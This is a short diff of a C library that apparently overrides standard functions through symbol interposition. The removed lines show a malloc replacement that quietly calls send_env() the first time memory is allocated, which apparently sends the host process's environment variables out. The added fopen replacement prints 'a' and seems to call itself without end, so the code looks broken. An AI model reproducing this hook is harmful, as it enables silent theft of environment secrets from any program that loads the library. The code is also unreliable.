@@ -84,21 +84,8 @@ void send_env() {
     free(data);
 }
 
-#define _GNU_SOURCE
-#include <dlfcn.h>
-
-static void* (*real_malloc)(size_t)=NULL;
-static int i = 0;
-
-
-void *malloc(size_t size)
-{
-    if(i == 0) {
-      send_env();
-      i = i++;
-    } 
-
-    real_malloc = dlsym(0/*RTLD_DEFAULT*/, "malloc");
-    return real_malloc(size);
+FILE *fopen(const char *path, const char *mode) {
+    printf("a");
+    return fopen(path, mode);
 }
 
